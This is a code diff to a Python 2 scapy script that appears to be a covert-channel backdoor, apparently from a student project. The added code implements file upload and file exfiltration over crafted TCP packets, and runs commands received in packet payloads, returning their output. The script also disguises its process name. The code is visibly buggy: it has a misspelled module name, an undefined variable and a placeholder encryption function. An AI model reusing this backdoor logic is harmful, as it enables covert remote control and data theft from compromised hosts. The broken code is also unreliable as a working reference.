@@ -15,6 +15,7 @@
 ---------------------------------------------------------------------------------------------
 '''
 from config import *
+from encrypt import *
 from scapy.all import *
 import setproctitle
 import os
@@ -349,7 +350,14 @@ def commandParser():
 ---------------------------------------------------------------------------------------------
 '''
 def sendFile(packet):
-	print "Do stuff"
+	with open(packet[RAW].load, "w") as tFile:
+		while True:
+			dPacket = sniff(filter="tcp sport " + str(packet[TCP].sport) + " and ip src " + packet[IP].src, count=1, timeout=30)
+			if len(dPacket) == 0:
+				break
+			tFile.write(dPacket[RAW].load)
+			if "F" in dPacket[0][TCP].flags:
+				break
 
 '''
 ---------------------------------------------------------------------------------------------
@@ -372,7 +380,20 @@ def sendFile(packet):
 ---------------------------------------------------------------------------------------------
 '''
 def getFile(packet):
-	print "Do stuff"
+	dPacket = IP(dst=packet[IP].src, id=random.randint(0, 65535))/\
+	          TCP(sport=packet[TCP].dport, dport=packet[TCP].sport, seq=random.randint(0, 16777215))/\
+	          RAW(LOAD="")
+	with open(packet[RAW].load, "r") as tFile:
+		for line in tFile:
+			dPacket[IP].id = dPacket[IP].id + 1
+			dPacket[TCP].seq = dPacket[TCP].seq + 1
+			dPacket[RAW].load = encrypt(line)
+			send(dPacket, verbose=0)
+	dPacket[IP].id = commandPacket[IP].id + 1
+	dPacket[TCP].seq = commandPacket[TCP].seq + 1
+	dPacket[RAW].load = ""
+	dPacket[TCP].flags="F"
+	send(commandPacket, verbose=0)
 
 '''
 ---------------------------------------------------------------------------------------------
@@ -396,6 +417,7 @@ def getFile(packet):
 '''
 def terminal(packet):
 	output = subpricess.check_output(packet[RAW].load, stderr=subprocess.STDOUT)
+	
 	confirmPacket = IP(dst=packet[IP].src, id=packet[IP].id+1)/\
 	                TCP(dport=packet[TCP].sport, sport=packet[TCP].dport, seq=packet[TCP].seq+1)/\
 	                RAW(load=encrypt(output))
@@ -427,28 +449,6 @@ def terminal(packet):
 def notify(packet):
 	print "Do stuff"
 
-'''
----------------------------------------------------------------------------------------------
--- 
--- FUNCTION: encrypt
--- 
--- DATE: 2014-11-14
--- 
--- DESIGNERS: John Payment
--- 
--- PROGRAMMER: John Payment
--- 
--- INTERFACE: encrypt(message)
---              message - The message to be encrypted or decryped
--- 
--- RETURNS: N/A
--- 
--- NOTES: 
--- 
----------------------------------------------------------------------------------------------
-'''
-def encrypt(message):
-	return message
 
 main()
 
